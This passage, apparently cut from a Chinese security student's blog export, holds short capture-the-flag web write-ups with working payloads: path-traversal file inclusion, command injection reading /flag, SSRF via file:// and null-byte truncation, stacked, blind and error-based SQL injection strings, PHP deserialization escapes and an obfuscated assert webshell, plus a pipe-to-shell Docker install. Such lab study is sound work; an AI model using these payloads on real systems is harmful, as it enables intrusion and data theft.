看了wp知道要查看版本信息去找对应的漏洞。没想到这么简单粗暴。 https://www.jianshu.com/p/fb9c2ae16d09 可以发现在index.php里：include $_REQUEST[‘target’];include这个函数,很可能存在本地文件包含链接里已经给出了相关poc我们直接利用即可paylaod:http://c66c8c33-f4ec-4bb4-b351-3302f06c8bdc.node3.buuoj.cn/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[安洵杯 2019]easy_web","slug":"安洵杯-2019-easy-web","date":"2020-07-18T07:31:26.000Z","updated":"2020-07-18T08:27:17.328Z","comments":true,"path":"2020/07/18/安洵杯-2019-easy-web/","link":"","permalink":"/2020/07/18/安洵杯-2019-easy-web/","excerpt":"","text":"http://abe9b6ec-e237-45f1-9ec3-36ab54c41dbb.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd= img貌似是base64处理过的字符串，解码得到MzUzNTM1MmU3MDZlNjc=，继续解码得到3535352e706e67，是十六进制的ascii码，解码得555.png。按照这思路加密index.php尝试读取。 前面的都不重要，重要的是cmd的部分。a和b md5强类型绕过，网上搜一个就行。cmd过滤了很多东西，但是还是可以用dir，在根目录找到了flag（空格被过滤，用%20代替空格） cmd=/bin/c\\at%20/flag flag{a8e20fc1-9183-4ab7-8d20-2bf697f447b4}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GKCTF2020]cve版签到","slug":"GKCTF2020-cve版签到","date":"2020-07-18T06:25:55.000Z","updated":"2020-07-18T07:06:38.005Z","comments":true,"path":"2020/07/18/GKCTF2020-cve版签到/","link":"","permalink":"/2020/07/18/GKCTF2020-cve版签到/","excerpt":"","text":"根据hint可知考察cve-2020-7066，是一个ssrf漏洞https://www.anquanke.com/vul/id/1966253 结合cve可知，get_headers()函数存在漏洞。通过\\0截断，访问本地主机。经过尝试，题目这里需使用%00截断?url=http://127.0.0.123%00.ctfhub.com 提示要以123 结束，得到flag：","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GKCTF2020]CheckIN","slug":"GKCTF2020-CheckIN","date":"2020-07-17T13:49:07.000Z","updated":"2020-07-17T15:30:09.960Z","comments":true,"path":"2020/07/17/GKCTF2020-CheckIN/","link":"","permalink":"/2020/07/17/GKCTF2020-CheckIN/","excerpt":"","text":"看到了eval，想到了一句话，给Ginko传参，但是要先经过base64加密。有一个一开始不太清楚的地方，导致卡住了： 首先传参phpinfo();看看，需要经过base64编码 试着上传一个一句话木马 找到了flag！但是打开啥都没有。。。下面readflag打开是乱码。 查看wp 通过phpinfo()知道php版本为7.3，这个版本有一个漏洞php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令影响范围是linux，php7.0-7.3给出了exphttps://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php下载后进行修改，改为执行readflag通过蚁剑上传至tmp目录下（因为这目录的权限较高），上传成功后在页面里包含文件即可获得flag 参考链接：https://blog.csdn.net/m0_46230316/article/details/106477417","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[SUCTF 2019]Pythonginx","slug":"SUCTF-2019-Pythonginx","date":"2020-07-17T06:42:03.000Z","updated":"2020-07-17T07:42:13.273Z","comments":true,"path":"2020/07/17/SUCTF-2019-Pythonginx/","link":"","permalink":"/2020/07/17/SUCTF-2019-Pythonginx/","excerpt":"","text":"应该要绕过两个if才会输出flag，简单来说就在前两个判断时不能是suctf.cc，第三个是suctf.cc。看了wp，这里用的是脚本爆破。脚本见 https://www.cnblogs.com/Cl0ud/p/12187204.html当URL 中出现一些特殊字符的时候，输出的结果可能不在预期。随便用一个来替换最后一个c就可以绕过了。/getUrl?url=file://suctf.c%E2%84%82/../../../../../etc/passwd 看到了nginx，于是去读取nginx的配置文件 /usr/local/nginx/conf/nginx.conf看到了flag","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GYCTF2020]Blacklist","slug":"GYCTF2020-Blacklist","date":"2020-07-16T15:09:27.000Z","updated":"2020-07-16T15:24:00.521Z","comments":true,"path":"2020/07/16/GYCTF2020-Blacklist/","link":"","permalink":"/2020/07/16/GYCTF2020-Blacklist/","excerpt":"","text":"这道题好像在哪见过，应该是上次强网杯的那个堆叠注入。1’;show columns from FlagHere;# flag就在这里，但是select被过滤了，这里要利用HANDLER 1’;handler FlagHere open;handler FlagHere read first;Handler FlagHere close;#","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Bugku刷题记录（三）","slug":"Bugku刷题记录（三）","date":"2020-07-16T09:38:55.000Z","updated":"2020-07-16T15:00:52.502Z","comments":true,"path":"2020/07/16/Bugku刷题记录（三）/","link":"","permalink":"/2020/07/16/Bugku刷题记录（三）/","excerpt":"","text":"一、PHP_encrypt_1(ISCCCTF) 传入flag作为参数给data得到了题目中那一串字符。附件中的代码给出了加密函数，所以只要写出泄密脚本就可以得到flag。 二、文件包含挂了。 三、flag.php点login没有任何反应，提示是hint，一开始以为是打错了或者应该漏了些什么，没想到是在提示hint是个参数。。。 得到源码。大致一看会觉得很简单，只要把ISecer:www.isecer.com序列化一下，然后bp提交cookie就行，其实仔细看下会发现，验证cookie的时候$KEY根本没有定义。。。。所以只要提交一个空字符串就行。cookie:ISecer=s:0:&quot;&quot;; 四、sql注入2这道题大概做了两个小时。。。。确实过滤了很多东西。新学习了一个减号闭合。还白嫖了一个很棒的字典QAQ。先来介绍一下减号闭合。如果输入admin’-1-‘，那么原语句就是select ‘admin’-0-‘’;会发生类型转换，字符串变成0，所以就是0-0-0=0又因为select from users where name=0 ,会输出所有语句。（$sql = select from users where username=$username;在字符串username的值和数字0比较的时候，字符串变为了0故此0=0）所以可以利用这点进行注入。substr、空格都被过滤了，但这里还可以用mid和括号来代替。构造语句ascii(substr((select database()),1,1))&gt;1很多过滤了，这个语句没法使用用到一个倒着截取假设：passwd=abc123那么我们用以下方式 mid((passwd)from(-1)):3 mid((passwd)from(-2)):23 mid((passwd)from(-3):123倒着看的第一位都是3，显然不行，无法截取出来，于是想到反转先反转REVERSE(MID((passwd)from(-%d))再取最后一位mid(REVERSE(MID((passwd)from(%-d)))from(-1))在比较ASCIIascii(mid(REVERSE(MID((passwd)from(%-d)))from(-1)))&gt;1 后面得到了密码登陆进去就比较简单了，但这sql做的我心态大崩。。。 bugku就先做到这里，看到后面一题是要用到渗透测试第一步信息收集。。回去接着做buu","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Bugku刷题记录（二）","slug":"Bugku刷题记录（二）","date":"2020-07-15T05:34:58.000Z","updated":"2020-07-15T16:52:26.832Z","comments":true,"path":"2020/07/15/Bugku刷题记录（二）/","link":"","permalink":"/2020/07/15/Bugku刷题记录（二）/","excerpt":"","text":"一、web8 ac=flags&amp;fn=flag.txt。 二、细心挂了。。 三、求getshellupload，后缀改为php5，content-type大小写绕过。 四、INSERT INTO 注入 根据源码可知这是X_FORWARDED_FOR注入，但是过滤了逗号，无法使用if语句。在mysql中与if有相同功效的就是：select case when (条件) then 代码1 else 代码 2 end;而且由于逗号,被过滤，我们就不能使用substr、substring了，但我们可以使用：from 1 for 1，所以最终的payload如下：127.0.0.1’+(select case when substr((select flag from flag) from 1 for 1)=’a’ then sleep(5) else 0 end))– +脚本学习了这个大佬的： //https://blog.csdn.net/xuchen16/article/details/82904488 L4：string模块里面的ascii_letters和digits代表大小写英文字母和数字。L6：insert into value (‘’)这句话，可以执行()内的sql语句。所以先闭合，然后进行sql语句的执行。这里使用了 select case when（满足条件）then（语句1）else（语句2） end语句；语句中的 from 0 for 1 等价于 limit 0,1。L13：添加xff头。L14：timieout=3如果网站再3s内没有应答，就会抛出异常。L15：因为在L7进行验证，如果True，就sleep(5)，这里就接受异常成功获取部分flag。知识：case when then else end语句。from 0 for 1 和from -1(从后往前)姿势的学习。这个代码的原理就是利用127.0.0.1+true/false去进行判断，如果是true，就与超时相违背，从而执行下面except的代码。 这道题还是不错的，了解了xff延时注入，写脚本也多了一种思路。 五、这是一个神奇的登陆框挂了。。 六、多次页面没有任何信息，url中有id，加上’报错，猜测是sql注入。id=1’or 1=1–+ 也报错，可能存在过滤用异或注入测一下过滤了啥，例：?id=1’^(length(‘union’)!=0)–+,如果返回页面显示正常，那就证明length(‘union’)==0的，也就是union被过滤了。同理测试出被过滤的字符串有：and，or，union，select。oorrder by测出来两个字段，接下来就是爆表爆字段了。基本操作就不写了，直接说结果：表flag1,hint，字段flag1,addressflag1中的数据不是flag，在address里找到了下一关的链接： 感觉和上次whuctf的那个sql一样，都是输入什么回显什么。。。当时用的是盲注。看了一下wp。当双写绕过和大小写绕过都没用时，这时我们需要用到报错注入。报错注入介绍：//https://blog.csdn.net/silence1_/article/details/90812612 爆库?id=1’ and(extractvalue(1,concat(0x7e,database(),0x7e)))–+ 爆表?id=1’ and(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tableswhere table_schema=”web1002-2”),0x7e)))–+ 爆列?id=1’ and(extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columnswhere table_schema=”web1002-2” and table_name=”flag2”),0x7e)))–+ 爆flag?id=1’ and(extractvalue(1,concat(0x7e,(select group_concat(flag2) from flag2),0x7e)))–+flag{Bugku-sql_6s-2i-4t-bug} 另：这一周有点水，下一周要大大增加学习量。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Bugku刷题记录（一）","slug":"Bugku刷题记录（一）","date":"2020-07-14T07:01:24.000Z","updated":"2020-07-15T16:24:21.744Z","comments":true,"path":"2020/07/14/Bugku刷题记录（一）/","link":"","permalink":"/2020/07/14/Bugku刷题记录（一）/","excerpt":"","text":"因为Bugku的题目都比较简单，一道题一篇有点水，所以就直接整合起来了，目标在四次之内刷完web部分。一、welcome to bugkuctf这道题挂了……已经打不开了，跳下一题。 二、过狗一句话提示：送给大家一个过狗一句话&lt;?php $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’]) ?&gt;发现里面的代码说明可以assert从而随意执行代码，而我们需要知道该目录下存在哪些文件。php中读取目录下文件的方法：最简单的是print_r(scandir($dir))payload：http://123.206.87.240:8010/?s=print_r(scandir(%27./%27))然后直接访问即可（此题flag已经被人删了） 三、字符？正则？这个正则还挺烦的. 匹配除 “\\n” 之外的任何单个字符 匹配它前面的表达式0次或多次，等价于{0,}{4,7} 最少匹配 4 次且最多匹配 7 次，结合前面的.也就是 匹配 4 到 7 个任意字符\\/ 匹配 / ，这里的 \\ 是为了转义[a-z] 匹配所有小写字母[:punct:] 匹配任何标点符号/i 表示不分大小写‘key’+任意单个字符+零个或多个+‘key’+任意单个字符+长度4-7+‘key:/’+任意单个字符+ / +（任意单个字符+零个或多个+‘key’)+英文小写字母一个+匹配‘!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~.’中一个字符payload：http://123.206.87.240:8002/web10/?id=keykey1234key:/2/keya@ 四、前女友(SKCTF)挂了。。 五、login1(SKCTF)挂了。。 六、你从哪里来进去后提示are you from google抓包改header就行。 七、md5 collision(NUPT_CTF)这道题觉得极不合理啊，进去之后没有任何提示，仅仅一个标题说了md5碰撞，但是具体呢？看了wp直接传了一个md5加密后开头是0e的值，觉得毫无逻辑可言。 八、程序员本地网站提示从本地访问，抓包，X-Forwarded-For: 127.0.0.1 九、各种绕过很简单的一个数组绕过。 今日总结：bugku上的题感觉都怪怪的。。。赶紧刷完回去复习buu上的题","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Bugku-never give up","slug":"Bugku-never-give-up","date":"2020-07-13T16:03:27.000Z","updated":"2020-07-13T16:22:45.810Z","comments":true,"path":"2020/07/14/Bugku-never-give-up/","link":"","permalink":"/2020/07/14/Bugku-never-give-up/","excerpt":"","text":"一开始真没找到突破口，最开始试了sql，然后抓包也没发现啥，除了注释里的1p.html，访问后直接跳转到https://www.bugku.com/，看了wp才知道直接看源码：view-source:http://123.206.87.240:8006/test/1p.html经过几次解码得到：关键部分审计：$data = @file_get_contents($a,’r’);if($data==”bugku is a nice plateform!” and $id==0 and strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4)id=0，a=bugku is a nice plateform!b的长度要大于5并且第一位是4但第一位又不能是4啊这？感觉你在玩我。直接访问f4l2a3g.txt，找到flag啊这…","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Bugku-cookies欺骗","slug":"Bugku-cookies欺骗","date":"2020-07-13T15:12:11.000Z","updated":"2020-07-13T15:44:45.584Z","comments":true,"path":"2020/07/13/Bugku-cookies欺骗/","link":"","permalink":"/2020/07/13/Bugku-cookies欺骗/","excerpt":"","text":"进去是一堆乱码：注意到url中filename有点像base64，解码得到keys.txt，猜测filename参数会决定所返回得页面。尝试访问index.php。filename=aW5kZXgucGhw。没有任何内容，此时注意到前面还有个line，猜测是回显的行数，输入1得到error_reporting(0); ，输入2得到$file=base64_decode(isset($_GET[‘filename’])?$_GET[‘filename’]:””);可以确定line就是返回的行数了，于是写个脚本来直接得到源码：关于requests.Session()：后面就比较简单了，因为源码并不复杂，抓包后加上cookie：margin=margin;","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"用docker搭建CTFd及近期拖更情况说明","slug":"用docker搭建CTFd及近期拖更情况说明","date":"2020-07-13T04:34:21.000Z","updated":"2020-07-13T06:51:02.598Z","comments":true,"path":"2020/07/13/用docker搭建CTFd及近期拖更情况说明/","link":"","permalink":"/2020/07/13/用docker搭建CTFd及近期拖更情况说明/","excerpt":"","text":"前几天一直在搞科一模拟（要连续两次95+QAQ），考了两天终于过了，17号正式考试。至于托更，一方面是因为在搞科一，另一方面是因为buu上现在做到的题确实太难了，感觉自己的基础并没有扎实到可以去做那些题目，所以打算接下来去把bugku上的基础题刷完（今天开始，这周的任务会尽量完成）。在考科一的空闲时间里我学习了如何搭建一个自己的CTF平台，接下来就是搭建的过程及踩的坑。首先是想在虚拟机上先本地搭建一个测试一下的，但是到了最后安装的时候，各种报错，几乎所有问题的种类都遇到了一遍，一晚上一直在研究玄学问题，到最后感觉虚拟机都已经废了。于是换了一台虚拟机继续，但还是同样的问题，应该是网上的教程比较老，一些改动没有加进去，比如说有些源根本就无法连接。到这差不多半天没了，如果这样还不行的话，只能换一种办法了——docker。用docker的话，我想一步到位了，直接在服务器上搭建。一、申请阿里云服务器通过阿里云的学生认证后可以免费领取一个云服务器，最好选择Linux的系统，不要问为什么不选Windows的，问就是花了两小时踩坑，ssh连不上，不知道是不是openssh服务没有安装的原因。在都设置好之后（如何设置可参考：https://www.cnblogs.com/Guorisy/p/12445224.html），用xshell连接上去。二、开始搭建使用xshell连接服务器后，在终端输入sudo vim /etc/apt/sources.list，将里面的内容删除换成：//添加阿里源//deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse//deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse//deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse//deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse//deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse//deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse//deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse//deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse//deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse//deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse替换完成保存然后执行命令sudo apt-get updatesudo apt-get upgrade #更新所有软件注意这里更新后会弹出选项，非常重要，选不好就gg了无脑选N好了，更新源后，一键安装docker：wget -qO- https://get.docker.com/ | sh然后在安装docker-compose：pip install docker-compose接下来安装CTFd：搜索镜像docker search CTFD拉取镜像docker pull ctfd/ctfd运行CTFddocker run -d -p 8080:8000 ctfd/ctfd然后访问服务器ip即可。顺便说一句，记得开放对应端口。 接下来会学习并进行深度自定义及上传题目。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GXYCTF2019]禁止套娃","slug":"GXYCTF2019-禁止套娃","date":"2020-07-09T15:45:04.000Z","updated":"2020-07-09T17:01:50.184Z","comments":true,"path":"2020/07/09/GXYCTF2019-禁止套娃/","link":"","permalink":"/2020/07/09/GXYCTF2019-禁止套娃/","excerpt":"","text":"上来是个空白页面，吸取之前的教训，直接dir扫：.git源码泄露利用githack获取源码分析源码：1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。2.过滤了常用的几个伪协议，不能以伪协议读取文件。3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。4.正则匹配掉了et/na/info等关键字，很多函数都用不了。5.eval($_GET[‘exp’]); 典型的无参数RCE。geushell不能用了，要想办法读取flag.php的内容，可以用scandir()函数百度得知，scandir的使用是至少必需要有一个directory的，但是我们又没有办法去定义一个变量，这时候就要考虑php有没有什么函数是自带常量的。localconv():既然是数组，就要用到current()payload:?exp=print_r(scandir(current(localeconv())));现在的问题就是怎么读取倒数第二个数组呢？这里可以用next()函数和array_reverse()函数 next()函数将数组内部指针指向下一个元素array_reverse()函数将数组倒序 之所以要进行倒序是因为next()里面要是一个数组，连续使用会导致多次使用后括号里不是数组，而进行倒序后再使用next只需使用一次，避开了这个问题。highlight_file输出，payload：?exp=highlight_file(next(array_reverse(scandir(current(localeconv()))))); 参考链接：https://blog.csdn.net/weixin_44348894/article/details/105568428https://www.cnblogs.com/wangtanzhi/p/12260986.html","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[De1CTF 2019]SSRF Me","slug":"De1CTF-2019-SSRF-Me","date":"2020-07-09T06:22:47.000Z","updated":"2020-07-09T08:04:27.746Z","comments":true,"path":"2020/07/09/De1CTF-2019-SSRF-Me/","link":"","permalink":"/2020/07/09/De1CTF-2019-SSRF-Me/","excerpt":"","text":"直接给出了源码： 太烦了直接看了wp。。。这道题讲也讲不明白，就当跳过吧。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[0CTF 2016]piapiapia","slug":"0CTF-2016-piapiapia","date":"2020-07-08T14:05:06.000Z","updated":"2020-07-08T16:30:29.119Z","comments":true,"path":"2020/07/08/0CTF-2016-piapiapia/","link":"","permalink":"/2020/07/08/0CTF-2016-piapiapia/","excerpt":"","text":"一个很普通的登陆界面，试了sql发现不行，找了半天也没找到线索，dir扫也没有结果。但是看了wp里面都是用的dirsearch扫出了源码，网上搜了下原因发现有时候在后面添加个延时参数，会大大提高扫描效率。（通过此题，我发誓以后不管怎样一定要先扫一遍）查看源码：config.php里有flag，但不可读：profile.php里出现了反序列化：下面有一个读取文件的函数猜测可以利用，只要将$profile[‘photo’]的值改为config.php，就能读取到config.php里面的flag在源码里整理一下逻辑结构register-&gt;login-&gt;update-&gt;profile登录和注册不看，从update开始对各个参数进行一些过滤，然后序列化$profile，跟进update_profile前面已经知道，我们的目的是要读取config.php从而得到flag，读取config.php需要替换$profile[‘photo’]，也就是要让config,php成为序列化的一部分，可以利用的是反序列化字符串逃逸。在后端中，反序列化是以”;}结束的，因此如果我们把”;}带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前结束而后面的内容就会被丢弃可知此处profile序列化后的结果为：a:4:{s:5:”phone”;s:11:”12345678900”;s:5:”email”;s:12:”123@qq.com“;s:8:”nickname”;s:3:”123”;s:5:”photo”;s:39:”upload/07cc694b9b3fc636710fa08b6922c42b”;}（此处为我刚刚注册的信息）然后我们将config.php替换进去：a:4:{s:5:”phone”;s:11:”12345678900”;s:5:”email”;s:12:”123@qq.com“;s:8:”nickname”;s:3:”123”;s:5:”photo”;s:10:”config.php”;}s:39:”upload/07cc694b9b3fc636710fa08b6922c42b”;}虽然给他反序列化之后结果photo的部分是config,php，但这样是读不到config.php的，因为更新profile的时候根本没地方插进去，因此就需要从nickname入手把这些数据悄悄带进去首先解决nickname的长度限制问题直接将nickname变成数组就可突破限制a:4:{s:5:”phone”;s:11:”12345678900”;s:5:”email”;s:12:”123@qq.com“;s:8:”nickname”;a:1:{i:0;s:3:”123”;}s:5:”photo”;s:10:”config.php”;}s:39:”upload/07cc694b9b3fc636710fa08b6922c42b”;}现在我们考虑怎么让”;}s:5:“photo”;s:10:“config.php”;}这34个字符逃逸出来前面提到Fliter会将where一类的函数替换成hacker，也就是说where在被正则替换后，其本身的长度会加1，如果我们构造34个where那么在传入后端之后hacker的长度就会将我们目标逃逸字符挤掉过程如下传入:s:8:”nickname”;a:1:{i:0;s:204:”34*where”;}s:5:”photo”;s:10:”config.php”;} 此时34*where”;}s:5:”photo”;s:10:”config.php”;}都作为nickname存在 正则替换:s:8:”nickname”;a:1:{i:0;s:204:”34*hacker”;}s:5:”photo”;s:10:”config.php”;} 因为s只有204个字符,所以读取第34个hacker之后就停止,34个字符”;}s:5:”photo”;s:10:”config.php”;}不再包含在nickname内 既然从nickname逃逸出，”};将前面的nickname数组闭合之后，剩下的s:5:”photo”;s:10:”config.php”;}就会被当作photo的部分了，至于后面的upload，由于被后面”;}结束反序列化，也就被丢弃，这样就实现了config.php的读取然后查看profile.php查看图片源码，base64解码即可： 总结：这道题应该是目前为止做过的最复杂的一题了，过几天自己再去复现一遍。 参考链接：https://blog.csdn.net/qq_43756333/article/details/106420509?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-6","categories":[],"tags":[],"keywords":[]},{"title":"[网鼎杯 2020 青龙组]AreUSerialz","slug":"网鼎杯-2020-青龙组-AreUSerialz","date":"2020-07-08T07:23:51.000Z","updated":"2020-07-08T13:13:26.202Z","comments":true,"path":"2020/07/08/网鼎杯-2020-青龙组-AreUSerialz/","link":"","permalink":"/2020/07/08/网鼎杯-2020-青龙组-AreUSerialz/","excerpt":"","text":"前一阵子学了反序列化，好久没有练习了，正好拿这道题练练手。先上源码：get方式提交的str，会对其进行一个合法性的判断，每一个字符的ASCII范围在32到125之间，然后对其反序列化。反序列化时首先会调用destruct()函数，destruct()会检测op值是否为’2’，如果为’2’就会令op=1，由于是===必须是类型和数值都等于’2’,所以可以让op等于数字2来绕过，然后__destruct()会调用process()，process()中如果op值为2将会执行read()函数，会读取fliename的文件，所以我们需要将op=2，filename=’php://filter/read=convert.base64-encode/resource=flag.php’（文件包含漏洞）进行序列化，序列化结果为str=O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php://filter/read=convert.base64-encode/resource=flag.php”;s:7:”content”;N;}最后base64解码即可","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"php反序列化","slug":"php反序列化","permalink":"/tags/php反序列化/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[RoarCTF 2019]Easy Java","slug":"RoarCTF-2019-Easy-Java","date":"2020-07-07T02:55:02.000Z","updated":"2020-07-07T04:53:27.561Z","comments":true,"path":"2020/07/07/RoarCTF-2019-Easy-Java/","link":"","permalink":"/2020/07/07/RoarCTF-2019-Easy-Java/","excerpt":"","text":"进去以后如图所示：尝试admin 123456提示密码错误。打开下面的help出现：java.io.FileNotFoundException:{help.docx}url：http://f72eefe1-b91c-4b64-af67-9bd43f96bf1c.node3.buuoj.cn/Download?filename=help.docx查看wp，知道可以尝试将请求方式由GET换为POST，POST后，得到help.docx，如图所示再次查看wp，知道这是源码泄露题根据help里的java推测这里是WEB-INF/web.xml泄露再次用post方式提交，果然得到源码：虽然看不懂，但是发现了这个flagcontroller访问/Flag：最后payload：filename=/WEB-INF/classes/com/wm/ctf/FlagController.classbase64解码文件中的代码即可 参考链接：https://blog.csdn.net/wy_97/article/details/78165051https://blog.csdn.net/silencediors/article/details/102579567?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[网鼎杯 2018]Fakebook","slug":"网鼎杯-2018-Fakebook","date":"2020-07-04T13:34:29.000Z","updated":"2020-07-04T16:15:19.513Z","comments":true,"path":"2020/07/04/网鼎杯-2018-Fakebook/","link":"","permalink":"/2020/07/04/网鼎杯-2018-Fakebook/","excerpt":"","text":"万万没想到robots.txt里面居然有东西，一开始一直以为漏洞在注册和登录之中，也没有用dir去扫。。。源码：在注册的帐号的主界面存在注入点：字段数为4：no=1 order by 4–+union select被过滤了，新学习了一种绕过的方法：union/**/select 注入点为2：no=1 union/**/select 1,2,3,4–+ 数据库为fakebook：no=0 union/**/select 1,database(),3,4–+ 表为users：no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’fakebook’–+ 列为no,username,passwd,data：no=0%20union/**/select%201,group_concat(column_name),3,4 from information_schema.columns where table_schema=’fakebook’ and table_name=’users’–+ 查出数据：no=0%20union/**/select%201,group_concat(no,’-‘,username,’-‘,passwd,’-‘,data),3,4 from fakebook.users –+ 很明显data是一串序列化的代码，还原后得到：发现：这个正是源码中的UserInfo类接下来再看之前找到的源码，这里有一个新的知识点：ssrf漏洞。SSRF,也就是Server Side RequestForgery—服务器端请求伪造。从字面上来看，与CSRF不同的是，它是服务器端发出的请求伪造而非从用户一端提交。别误会，作为受信任用户，服务器当然不可能做出损害用户信息的事。它是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。因为它是由服务端发起的，所以它能够请求到与它相连但与外网隔离的内部系统。一般由curl的滥用引起。更多关于ssrf漏洞的介绍详见：https://www.jianshu.com/p/d1d1c40f6d4c说一下我自己的理解：首先这个ssrf漏洞具体是如何判断出来的我暂且不去搞的非常明白，目前先记住看到curl就要联想到ssrf就行。在判断这里存在了ssrf漏洞之后，就要想办法去利用它进行flag的读取。回到一开始的界面：可以看到name、age、blog等信息，此时再看data那里反序列化后的结果，所有的信息都被藏在了data列里，猜测服务器是通过查询data字段,得到其中的序列化信息来渲染整个页面,从而恰好得到页面中的username,age,blog值。在猜想到这个逻辑之后，我们就可以通过修改查询的序列化对象的值来构造ssrf请求,从而读取到flag文件。利用flie协议读取文件：最终payload：http://9ccd5c5c-9dea-4d09-87ab-06ac06819869.node3.buuoj.cn/view.php?no=0%20union/**/select%201,2,3,%27O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}%27%20from%20users%20--+ 查看页面源代码，访问界面即可 最后：这道题是一道综合性很强的题，用到了ssrf、反序列化、sql注入，难度还是比较大的。但是写的很乱，不知道能不能让读者理解我的意思。 参考链接：1、https://blog.csdn.net/qq_44657899/article/details/1048845531、https://www.cnblogs.com/hello-there/p/12846239.html","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"ssrf漏洞","slug":"ssrf漏洞","permalink":"/tags/ssrf漏洞/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[强网杯 2019]高明的黑客","slug":"强网杯-2019-高明的黑客（失败）","date":"2020-07-04T02:21:10.000Z","updated":"2020-07-04T08:42:23.958Z","comments":true,"path":"2020/07/04/强网杯-2019-高明的黑客（失败）/","link":"","permalink":"/2020/07/04/强网杯-2019-高明的黑客（失败）/","excerpt":"","text":"根据提示下载源码：url/www.tar.gz打开发现有大量的包含shell的php文件，猜测其中肯定有可以使用的shell，所以只能用脚本去试了。百度，启动！ 2小时后：试了n个脚本，要么就是有问题的，要么就是太慢，还有的跑出来一大堆。最后是直接找到那个对的文件然后手动输入的。。。。。。本来以为能记录一道比较有意义的题结果以自闭结束：）但是本身这道题对编程能力要求就比较高，做不出来也是正常的。 参考链接：https://blog.csdn.net/a3320315/article/details/102945940","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[CISCN2019 华北赛区 Day2 Web1]Hack 